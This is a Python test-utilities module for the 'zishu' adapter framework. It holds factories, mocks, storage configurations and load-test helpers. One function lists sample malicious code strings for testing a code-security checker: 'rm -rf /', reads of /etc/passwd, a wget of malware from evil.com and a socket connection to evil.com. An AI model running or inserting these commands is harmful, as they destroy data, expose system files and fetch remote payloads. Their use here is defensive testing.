# -*- coding: utf-8 -*-
"""
适配器测试工具模块
为新架构的适配器系统提供专用测试工具和辅助函数
"""

import asyncio
import tempfile
import shutil
import uuid
import json
import time
from pathlib import Path
from typing import Dict, Any, List, Optional, Union, Callable
from unittest.mock import Mock, AsyncMock, patch
from datetime import datetime, timezone
import pytest

# 项目导入
from zishu.adapters.core.types import (
    AdapterType, AdapterStatus, LifecycleState, EventType, 
    HealthStatus, SecurityLevel, Priority
)


class AdapterTestUtils:
    """适配器测试工具类"""
    
    @staticmethod
    def create_test_adapter_identity(
        adapter_id: Optional[str] = None,
        name: Optional[str] = None,
        version: str = "1.0.0",
        adapter_type: AdapterType = AdapterType.SOFT
    ):
        """创建测试用适配器身份信息"""
        from zishu.adapters.core.types import AdapterIdentity
        
        return AdapterIdentity(
            adapter_id=adapter_id or f"test-adapter-{uuid.uuid4().hex[:8]}",
            name=name or f"Test Adapter {uuid.uuid4().hex[:4]}",
            version=version,
            adapter_type=adapter_type,
            description="Test adapter for unit testing",
            author="test_system",
            tags={"test", "mock", "unit_test"}
        )
    
    @staticmethod
    def create_test_adapter_configuration(
        config: Optional[Dict[str, Any]] = None,
        security_level: SecurityLevel = SecurityLevel.INTERNAL,
        priority: Priority = Priority.MEDIUM
    ):
        """创建测试用适配器配置"""
        from zishu.adapters.core.types import AdapterConfiguration, AdapterType
        
        # 创建模拟适配器类
        class MockAdapterClass:
            def __init__(self, config):
                self.config = config
                self.name = "test_adapter"
                self.adapter_id = "test_adapter_id"
                self.is_running = False
            
            async def initialize(self):
                return True
            
            async def start(self):
                """启动适配器"""
                self.is_running = True
                return True
            
            async def stop(self):
                """停止适配器"""
                self.is_running = False
                return True
            
            async def process(self, input_data, context):
                return {"result": "mock_processed", "input": input_data}
            
            async def cleanup(self):
                pass
            
            async def health_check(self):
                from zishu.adapters.core.types import HealthCheckResult, HealthStatus
                return HealthCheckResult(
                    status=HealthStatus.HEALTHY,
                    checks={"connectivity": True, "resources": True},
                    details={"test": "passed"},
                    message="Mock adapter is healthy"
                )
        
        default_config = {
            "test_mode": True,
            "timeout": 30,
            "max_retries": 3,
            "enable_logging": True,
            "adapter_type": "soft"  # 添加必需的适配器类型
        }
        
        if config:
            default_config.update(config)
        
        return AdapterConfiguration(
            identity=f"test_adapter_{id(default_config)}",  # 生成唯一ID
            name="Test Adapter",
            version="1.0.0",
            adapter_type=AdapterType.SOFT,
            adapter_class=MockAdapterClass,  # 添加适配器类
            config=default_config,
            environment={"TEST_ENV": "true"},
            resources={"memory_limit": "512MB", "cpu_limit": "1"},
            security_level=security_level,
            priority=priority
        )
    
    @staticmethod
    def create_test_adapter_registration(
        identity: Optional[Any] = None,
        adapter_class: Optional[type] = None,
        configuration: Optional[Any] = None
    ):
        """创建测试用适配器注册信息"""
        from zishu.adapters.core.types import AdapterRegistration
        
        if identity is None:
            identity = AdapterTestUtils.create_test_adapter_identity()
        
        if adapter_class is None:
            # 创建模拟适配器类
            class MockAdapterClass:
                def __init__(self, config):
                    self.config = config
                    self.name = identity.name
                    self.adapter_id = identity.adapter_id
                
                async def initialize(self):
                    return True
                
                async def process(self, input_data, context):
                    return {"result": "mock_processed", "input": input_data}
                
                async def cleanup(self):
                    pass
            
            adapter_class = MockAdapterClass
        
        if configuration is None:
            configuration = AdapterTestUtils.create_test_adapter_configuration()
        
        return AdapterRegistration(
            identity=identity,
            adapter_class=adapter_class,
            configuration=configuration
        )
    
    @staticmethod
    def create_test_event(
        event_type: EventType = EventType.ADAPTER_REGISTERED,
        source: str = "test_system",
        data: Optional[Dict[str, Any]] = None,
        priority: Priority = Priority.MEDIUM
    ):
        """创建测试用事件"""
        from zishu.adapters.core.types import Event
        
        return Event(
            event_type=event_type,
            source=source,
            data=data or {"test": True},
            priority=priority
        )
    
    @staticmethod
    def create_test_health_check_result(
        status: HealthStatus = HealthStatus.HEALTHY,
        checks: Optional[Dict[str, bool]] = None,
        details: Optional[Dict[str, Any]] = None,
        message: Optional[str] = None
    ):
        """创建测试用健康检查结果"""
        from zishu.adapters.core.types import HealthCheckResult
        
        return HealthCheckResult(
            status=status,
            checks=checks or {"test_check": True},
            details=details or {"test_detail": "all_good"},
            message=message or "Test health check result"
        )
    
    @staticmethod
    async def wait_for_condition(
        condition_func: Callable,
        timeout: float = 5.0,
        interval: float = 0.1,
        error_message: str = "Condition not met within timeout"
    ) -> bool:
        """等待条件满足"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                if asyncio.iscoroutinefunction(condition_func):
                    result = await condition_func()
                else:
                    result = condition_func()
                
                if result:
                    return True
            except Exception:
                pass  # 忽略检查过程中的异常
            
            await asyncio.sleep(interval)
        
        raise TimeoutError(error_message)
    
    @staticmethod
    def assert_adapter_registration_valid(registration):
        """断言适配器注册信息有效"""
        assert registration is not None
        assert hasattr(registration, 'identity')
        assert hasattr(registration, 'adapter_class')
        assert hasattr(registration, 'configuration')
        assert hasattr(registration, 'status')
        assert hasattr(registration, 'lifecycle_state')
        
        # 检查身份信息
        identity = registration.identity
        assert identity.adapter_id
        assert identity.name
        assert identity.version
        assert isinstance(identity.adapter_type, AdapterType)
        
        # 检查状态
        assert isinstance(registration.status, AdapterStatus)
        assert isinstance(registration.lifecycle_state, LifecycleState)
    
    @staticmethod
    def assert_event_valid(event):
        """断言事件有效"""
        assert event is not None
        assert hasattr(event, 'event_id')
        assert hasattr(event, 'event_type')
        assert hasattr(event, 'source')
        assert hasattr(event, 'timestamp')
        assert hasattr(event, 'data')
        assert hasattr(event, 'priority')
        
        assert event.event_id
        assert isinstance(event.event_type, EventType)
        assert event.source
        assert isinstance(event.data, dict)
        assert isinstance(event.priority, Priority)
    
    @staticmethod
    def assert_health_check_result_valid(result):
        """断言健康检查结果有效"""
        assert result is not None
        assert hasattr(result, 'status')
        assert hasattr(result, 'timestamp')
        assert hasattr(result, 'checks')
        assert hasattr(result, 'details')
        assert hasattr(result, 'is_healthy')
        
        assert isinstance(result.status, HealthStatus)
        assert isinstance(result.checks, dict)
        assert isinstance(result.details, dict)
        assert isinstance(result.is_healthy, bool)


class SecurityTestUtils:
    """安全测试工具类"""
    
    @staticmethod
    def create_test_security_context(
        user_id: str = "test_user",
        session_id: Optional[str] = None,
        permissions: Optional[List[str]] = None,
        security_level: SecurityLevel = SecurityLevel.INTERNAL
    ):
        """创建测试用安全上下文"""
        return {
            "user_id": user_id,
            "session_id": session_id or f"session_{uuid.uuid4().hex[:8]}",
            "permissions": permissions or ["read", "write"],
            "security_level": security_level.value,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "test_mode": True
        }
    
    @staticmethod
    def create_malicious_code_samples():
        """创建恶意代码样本用于测试"""
        return [
            "import os; os.system('rm -rf /')",
            "exec('__import__(\"os\").system(\"cat /etc/passwd\")')",
            "eval('1+1; import subprocess; subprocess.call([\"ls\", \"/\"])')",
            "__import__('subprocess').call(['wget', 'http://evil.com/malware'])",
            "open('/etc/passwd', 'r').read()",
            "import socket; socket.create_connection(('evil.com', 80))"
        ]
    
    @staticmethod
    def create_safe_code_samples():
        """创建安全代码样本用于测试"""
        return [
            "print('Hello, World!')",
            "x = 1 + 1; print(x)",
            "def greet(name): return f'Hello, {name}!'",
            "import math; print(math.pi)",
            "data = [1, 2, 3]; print(sum(data))",
            "result = {'status': 'success', 'data': [1, 2, 3]}"
        ]
    
    @staticmethod
    def assert_security_violation_detected(violation_result):
        """断言检测到安全违规"""
        assert violation_result is not None
        assert violation_result.get('is_safe') is False
        assert 'violations' in violation_result
        assert len(violation_result['violations']) > 0


class MetricsTestUtils:
    """指标测试工具类"""
    
    @staticmethod
    def create_test_metrics_data(
        adapter_id: str = "test_adapter",
        execution_count: int = 10,
        success_count: int = 8,
        error_count: int = 2,
        avg_execution_time: float = 0.5
    ):
        """创建测试用指标数据"""
        return {
            "adapter_id": adapter_id,
            "execution_count": execution_count,
            "success_count": success_count,
            "error_count": error_count,
            "success_rate": success_count / execution_count if execution_count > 0 else 0,
            "error_rate": error_count / execution_count if execution_count > 0 else 0,
            "average_execution_time": avg_execution_time,
            "total_execution_time": avg_execution_time * execution_count,
            "last_execution_time": datetime.now(timezone.utc).isoformat(),
            "memory_usage": 1024 * 1024 * 100,  # 100MB
            "cpu_usage": 25.5,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
    
    @staticmethod
    def create_performance_benchmark():
        """创建性能基准测试数据"""
        return {
            "max_response_time": 1.0,  # 秒
            "min_throughput": 100,     # 请求/秒
            "max_memory_usage": 512,   # MB
            "max_cpu_usage": 80,       # %
            "max_error_rate": 0.01,    # 1%
            "target_availability": 0.999  # 99.9%
        }
    
    @staticmethod
    def assert_metrics_within_bounds(metrics, benchmark):
        """断言指标在预期范围内"""
        if 'average_execution_time' in metrics:
            assert metrics['average_execution_time'] <= benchmark['max_response_time']
        
        if 'error_rate' in metrics:
            assert metrics['error_rate'] <= benchmark['max_error_rate']
        
        if 'memory_usage' in metrics:
            assert metrics['memory_usage'] <= benchmark['max_memory_usage'] * 1024 * 1024
        
        if 'cpu_usage' in metrics:
            assert metrics['cpu_usage'] <= benchmark['max_cpu_usage']


class StorageTestUtils:
    """存储测试工具类"""
    
    @staticmethod
    def create_test_storage_config(backend_type: str = "memory"):
        """创建测试用存储配置"""
        configs = {
            "memory": {
                "backend": "memory",
                "max_size": 1000,
                "ttl": 3600
            },
            "file": {
                "backend": "file",
                "file_path": "/tmp/test_storage.json",
                "backup_enabled": False
            },
            "sqlite": {
                "backend": "sqlite",
                "database_path": ":memory:",
                "table_name": "test_adapters"
            },
            "redis": {
                "backend": "redis",
                "host": "localhost",
                "port": 6379,
                "db": 15,  # 使用测试数据库
                "password": None
            },
            "postgresql": {
                "backend": "postgresql",
                "host": "localhost",
                "port": 5432,
                "database": "test_zishu",
                "username": "test_user",
                "password": "test_pass"
            },
            "mongodb": {
                "backend": "mongodb",
                "host": "localhost",
                "port": 27017,
                "database": "test_zishu",
                "collection": "test_adapters"
            }
        }
        
        return configs.get(backend_type, configs["memory"])
    
    @staticmethod
    def create_test_storage_data():
        """创建测试用存储数据"""
        return {
            "test_key_1": {"value": "test_value_1", "type": "string"},
            "test_key_2": {"value": 42, "type": "integer"},
            "test_key_3": {"value": [1, 2, 3], "type": "list"},
            "test_key_4": {"value": {"nested": "data"}, "type": "dict"},
            "test_key_5": {"value": True, "type": "boolean"}
        }
    
    @staticmethod
    async def cleanup_test_storage(storage_backend):
        """清理测试存储"""
        try:
            if hasattr(storage_backend, 'clear'):
                await storage_backend.clear()
            elif hasattr(storage_backend, 'delete_all'):
                await storage_backend.delete_all()
            elif hasattr(storage_backend, 'cleanup'):
                await storage_backend.cleanup()
        except Exception as e:
            print(f"Warning: Failed to cleanup test storage: {e}")
    
    @staticmethod
    def assert_storage_operations_work(storage_backend):
        """断言存储操作正常工作"""
        assert hasattr(storage_backend, 'get')
        assert hasattr(storage_backend, 'set')
        assert hasattr(storage_backend, 'delete')
        assert hasattr(storage_backend, 'exists')
        assert hasattr(storage_backend, 'list_keys')


class MockFactory:
    """模拟对象工厂"""
    
    @staticmethod
    def create_mock_event_bus():
        """创建模拟事件总线"""
        mock_bus = Mock()
        mock_bus.emit = AsyncMock()
        mock_bus.subscribe = Mock()
        mock_bus.unsubscribe = Mock()
        mock_bus.get_subscribers = Mock(return_value=[])
        return mock_bus
    
    @staticmethod
    def create_mock_adapter_manager():
        """创建模拟适配器管理器"""
        mock_manager = Mock()
        mock_manager.register_adapter = AsyncMock(return_value=True)
        mock_manager.unregister_adapter = AsyncMock(return_value=True)
        mock_manager.start_adapter = AsyncMock(return_value=True)
        mock_manager.stop_adapter = AsyncMock(return_value=True)
        mock_manager.list_adapters = AsyncMock(return_value=[])
        mock_manager.get_adapter = AsyncMock(return_value=None)
        mock_manager.get_system_health = AsyncMock(return_value={})
        mock_manager.get_system_metrics = AsyncMock(return_value={})
        return mock_manager
    
    @staticmethod
    def create_mock_security_manager():
        """创建模拟安全管理器"""
        mock_security = Mock()
        mock_security.authenticate_user = AsyncMock(return_value=True)
        mock_security.check_permission = AsyncMock(return_value=True)
        mock_security.create_security_session = AsyncMock(return_value="test_session")
        mock_security.analyze_code_security = AsyncMock(return_value={"is_safe": True})
        mock_security.get_security_status = AsyncMock(return_value={"status": "secure"})
        return mock_security
    
    @staticmethod
    def create_mock_metrics_service():
        """创建模拟指标服务"""
        mock_metrics = Mock()
        mock_metrics.collect_metrics = AsyncMock(return_value={})
        mock_metrics.get_adapter_metrics = AsyncMock(return_value={})
        mock_metrics.export_metrics = AsyncMock(return_value="")
        mock_metrics.get_system_metrics_summary = AsyncMock(return_value={})
        return mock_metrics


# 测试装饰器
def async_test_timeout(timeout: float = 10.0):
    """异步测试超时装饰器"""
    def decorator(func):
        async def wrapper(*args, **kwargs):
            return await asyncio.wait_for(func(*args, **kwargs), timeout=timeout)
        return wrapper
    return decorator


def skip_if_no_backend(backend_name: str):
    """如果后端不可用则跳过测试"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            try:
                if backend_name == "redis":
                    import redis
                    redis.Redis(host='localhost', port=6379, db=15).ping()
                elif backend_name == "postgresql":
                    import psycopg2
                    # 这里可以添加连接测试
                elif backend_name == "mongodb":
                    import pymongo
                    # 这里可以添加连接测试
                return func(*args, **kwargs)
            except Exception:
                pytest.skip(f"Backend {backend_name} not available")
        return wrapper
    return decorator


# 性能测试工具
class PerformanceTestUtils:
    """性能测试工具类"""
    
    @staticmethod
    async def measure_async_execution_time(coro):
        """测量异步函数执行时间"""
        start_time = time.time()
        result = await coro
        end_time = time.time()
        return result, end_time - start_time
    
    @staticmethod
    def measure_memory_usage(func, *args, **kwargs):
        """测量内存使用情况"""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        memory_before = process.memory_info().rss
        
        if asyncio.iscoroutinefunction(func):
            result = asyncio.run(func(*args, **kwargs))
        else:
            result = func(*args, **kwargs)
        
        memory_after = process.memory_info().rss
        memory_delta = memory_after - memory_before
        
        return result, {
            "memory_before_mb": memory_before / (1024 * 1024),
            "memory_after_mb": memory_after / (1024 * 1024),
            "memory_delta_mb": memory_delta / (1024 * 1024)
        }
    
    @staticmethod
    async def run_load_test(
        async_func: Callable,
        concurrent_requests: int = 10,
        total_requests: int = 100,
        *args, **kwargs
    ):
        """运行负载测试"""
        results = []
        errors = []
        
        async def single_request():
            try:
                start_time = time.time()
                result = await async_func(*args, **kwargs)
                end_time = time.time()
                return {
                    "success": True,
                    "result": result,
                    "execution_time": end_time - start_time
                }
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "execution_time": 0
                }
        
        # 创建信号量控制并发
        semaphore = asyncio.Semaphore(concurrent_requests)
        
        async def controlled_request():
            async with semaphore:
                return await single_request()
        
        # 执行所有请求
        tasks = [controlled_request() for _ in range(total_requests)]
        results = await asyncio.gather(*tasks)
        
        # 统计结果
        successful_results = [r for r in results if r["success"]]
        failed_results = [r for r in results if not r["success"]]
        
        if successful_results:
            avg_time = sum(r["execution_time"] for r in successful_results) / len(successful_results)
            max_time = max(r["execution_time"] for r in successful_results)
            min_time = min(r["execution_time"] for r in successful_results)
        else:
            avg_time = max_time = min_time = 0
        
        return {
            "total_requests": total_requests,
            "successful_requests": len(successful_results),
            "failed_requests": len(failed_results),
            "success_rate": len(successful_results) / total_requests,
            "average_response_time": avg_time,
            "max_response_time": max_time,
            "min_response_time": min_time,
            "errors": [r["error"] for r in failed_results]
        }


# 导出所有工具类
__all__ = [
    'AdapterTestUtils',
    'SecurityTestUtils', 
    'MetricsTestUtils',
    'StorageTestUtils',
    'MockFactory',
    'PerformanceTestUtils',
    'async_test_timeout',
    'skip_if_no_backend'
]
